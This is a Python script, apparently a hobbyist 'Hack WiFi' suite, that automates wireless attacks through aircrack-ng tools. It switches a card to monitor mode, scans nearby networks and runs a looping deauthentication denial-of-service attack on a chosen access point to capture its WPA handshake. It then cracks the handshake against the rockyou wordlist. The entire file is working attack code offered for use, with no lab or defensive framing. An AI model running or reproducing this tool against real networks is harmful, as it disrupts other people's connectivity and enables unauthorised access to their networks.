import os
import subprocess
import sys
import time
import signal
import csv
import threading

# global varebals
selected_iface = None
attack_process = None
handshake_captured = False

# Determine whether to prefix commands with sudo depending on runtime UID
SUDO_PREFIX = "" if os.geteuid() == 0 else "sudo "

def show_banner():
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    END = '\033[0m'

    banner = f"""
 {BLUE}    ╔════════════════════════════════════════════════════════╗
     ║{RED}{BOLD}  ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗    ██╗███████╗██╗ {BLUE}║
     ║{RED}{BOLD}  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║    ██║██╔═���══╝██║ {BLUE}║
     ║{RED}{BOLD}  ███████║███████║██║     █████╔╝     ██║ █╗ ██║█████╗  ██║ {BLUE}║
     ║{RED}{BOLD}  ██╔══██║██╔══██║██║     ██╔═██╗     ██║███╗██║██╔══╝  ██║ {BLUE}║
     ║{RED}{BOLD}  ██║  ██║██║  ██║╚██████╗██║  ██╗    ╚███╔███╔╝██║     ██║ {BLUE}║
     ║{RED}{BOLD}  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝     ╚═╝ {BLUE}║
     ║                                                        ║
     ║{YELLOW}       [ + ] Wireless Suite: Auto-Folder Mode [ + ]     {BLUE}║
     ║{GREEN}               Created By: 4dmin attacker               {BLUE}║
     ╚════════════════════════════════════════════════════════╝{END}
     """
    print(banner) # print banner

def run_command(cmd): # run commands in sys
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def cleanup_and_exit(sig, frame): # عند الخروج من ال��رنامج يعيد المحول لما كان علية و يحولة لوضع managed
    global attack_process, selected_iface
    print("\n\n[!] Cleaning up and restoring network...")
    if attack_process: attack_process.terminate()
    if selected_iface: # تحديد المحول لاجراء العمليات التحويل monitor to managed و العكس
        run_command(f"{SUDO_PREFIX}ip link set {selected_iface} down")
        run_command(f"{SUDO_PREFIX}iw {selected_iface} set type managed")
        run_command(f"{SUDO_PREFIX}ip link set {selected_iface} up")
        run_command(f"{SUDO_PREFIX}systemctl start NetworkManager")
    print("[+] Done. System restored.")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup_and_exit)

def get_interfaces(): # معرفة المحولات الاسلكية المتصلة بالجهاز
    interfaces = []
    output = run_command(f"{SUDO_PREFIX}iw dev").stdout
    current_iface = None
    for line in output.split('\n'):
        if 'Interface' in line: current_iface = line.split()[1]
        if 'type' in line and current_iface:
            interfaces.append({'name': current_iface, 'mode': line.split()[1]})
    return interfaces

def set_monitor_mode(iface): # تحويل ل monitor mode
    print(f"[*] Switching {iface} to monitor mode...")
    run_command(f"{SUDO_PREFIX}airmon-ng check kill")
    run_command(f"{SUDO_PREFIX}ip link set {iface} down")
    run_command(f"{SUDO_PREFIX}iw {iface} set type monitor")
    run_command(f"{SUDO_PREFIX}ip link set {iface} up")
    return True


def scan_networks():
    print("\n[*] Scanning for networks (press Ctrl+C to stop)...")
    temp_file = "temp_scan"
    run_command(f"{SUDO_PREFIX}rm {temp_file}* > /dev/null 2>&1")  # delet temp file

    cmd = f"{SUDO_PREFIX}airodump-ng --write {temp_file} --output-format csv {selected_iface}"
    # تشغيل airodump-ng كعملية فرعية بلا timeout
    dump_proc = subprocess.Popen(cmd, shell=True)

    # مؤقتاً أعد SIGINT إلى المعالج الافتراضي حتى نستطيع التقاط KeyboardInterrupt هنا
    old_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal.default_int_handler)
    try:
        # الانتظار حتى يضغط المستخدم Ctrl+C (يولد KeyboardInterrupt)
        dump_proc.wait()
    except KeyboardInterrupt:
        # المستخدم ضغط Ctrl+C: أوقف العملية ثم تابع لتحليل csv
        try:
            dump_proc.terminate()
        except Exception:
            pass
    finally:
        # استرجع معالج الإشارة السابق
        signal.signal(signal.SIGINT, old_handler)

    net_list = []
    csv_file = f"{temp_file}-01.csv"
    if os.path.exists(csv_file):
        print("\nID  | SSID                 | BSSID             | CH")
        print("----|----------------------|-------------------|---")
        with open(csv_file, 'r') as f:
            reader = csv.reader(f)
            start = False
            for row in reader:
                if not row or len(row) < 14: continue
                if "BSSID" in row[0]: start = True; continue
                if "Station" in row[0]: break
                if start:
                    ssid = row[13].strip() or "Hidden_SSID"
                    net_list.append({"bssid": row[0].strip(), "chan": row[3].strip(), "ssid": ssid}) # srearch [bssid, channel, ssid, id] in csv file and add result to list "net_list"
                    print(f"{len(net_list):<3} | {ssid[:20]:<20} | {row[0]:<17} | {row[3]}") # print result after srearching
    return net_list

# Dos attack
def deauth_loop(target_bssid, iface):
    """هجوم Deauth متقطع: 10 ثواني عمل، 5 ثواني توقف""" # <===== ركز هنا
    while not handshake_captured:
        print(f"\n[Attack] Sending Deauth to {target_bssid} (10s)...")
        # إرسال عدد معين من الحزم ثم الانتظار
        cmd = f"{SUDO_PREFIX}aireplay-ng --deauth 20 -a {target_bssid} {iface}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL)
        time.sleep(5)
# spaying handshake attacke
def capture_handshake_smart(target):
    global handshake_captured
    handshake_captured = False
    
    # إنشاء الفولدر باسم الشبكة
    folder_name = "".join([c if c.isalnum() else "_" for c in target['ssid']])
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
        print(f"[+] Created directory: {folder_name}")
    else:
        print(f"cant create handshake forder, rmove {folder_name}, or rename it, because create handshake folder")

    cap_file_path = os.path.join(folder_name, "handshake_data")

    print(f"[*] Monitoring {target['ssid']} inside folder '{folder_name}'...")
    
    # تشغيل التنصت
    dump_cmd = f"{SUDO_PREFIX}airodump-ng -c {target['chan']} --bssid {target['bssid']} -w {cap_file_path} {selected_iface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True) # run command

    # تشغيل خيط الـ Deauth
    deauth_thread = threading.Thread(target=deauth_loop, args=(target['bssid'], selected_iface))
    deauth_thread.daemon = True
    deauth_thread.start()

    print("\n[!] WORKING: Check the top-right of the screen for 'WPA Handshake'.")
    print("[!] Press Ctrl+C when the handshake is captured.")
    
    try:
        dump_proc.wait()
    except KeyboardInterrupt:
        handshake_captured = True
        dump_proc.terminate()
        final_cap = f"{cap_file_path}-01.cap"
        currunt_path = os.getcwd()
        print(f"\n[+] Stop. Data saved to: {currunt_path}/{final_cap}")
        return final_cap
# handshake cracking  
def crack_handshake(target):
    # البحث عن ملف الـ cap في فولدر الشبكة
    folder_name = "".join([c if c.isalnum() else "_" for c in target['ssid']])
    cap_file = os.path.join(folder_name, "handshake_data-01.cap")
    
    if not os.path.exists(cap_file):
        print(f"[-] No capture file found in {folder_name}/. Run Mode 2 first.")
        return

    print(f"\n--- Cracking Mode for: {target['ssid']} ---")
    wordlist = input("Path to Wordlist (default: /usr/share/wordlists/rockyou.txt): ") or "/usr/share/wordlists/rockyou.txt"
    
    if not os.path.exists(wordlist):
        print("[-] Wordlist not found!")
        return
    
    cmd = f"{SUDO_PREFIX}aircrack-ng -w {wordlist} {cap_file}"
    subprocess.run(cmd, shell=True)
# main & start all
def main():
    global selected_iface
    show_banner()
    if os.getuid() != 0: print("[-] Error: Run as root (sudo)!"); return 

    ifaces = get_interfaces()
    if not ifaces: print("[-] No WiFi cards found."); return
    
    for i, iface in enumerate(ifaces): print(f"[{i}] {iface['name']} ({iface['mode']})")
    idx = int(input("\nSelect Interface: "))
    selected_iface = ifaces[idx]['name']
    
    if ifaces[idx]['mode'] != 'monitor': set_monitor_mode(selected_iface) 

    while True:
        nets = scan_networks()
        if not nets: continue
        
        try:
            choice = int(input("\nTarget ID (or 0 to rescan): "))
            if choice == 0: continue # rescan
            target = nets[choice-1]
        except: continue

        print(f"\nTarget: {target['ssid']}")
        print(f"1. Monitor (No Attack)\n2. Smart Handshake (Auto-Deauth + Folder)\n3. Crack Handshake (from folder)\n4. Exit") 
        mode = input("Select: ")

        if mode == '1':
            # وضع المراقبة البسيط
            subprocess.run(f"{SUDO_PREFIX}airodump-ng -c {target['chan']} --bssid {target['bssid']} {selected_iface}", shell=True)
        elif mode == '2':
            capture_handshake_smart(target)
        elif mode == '3':
            crack_handshake(target)
        elif mode == '4':
            cleanup_and_exit(None, None)

if __name__ == "__main__":
    main()
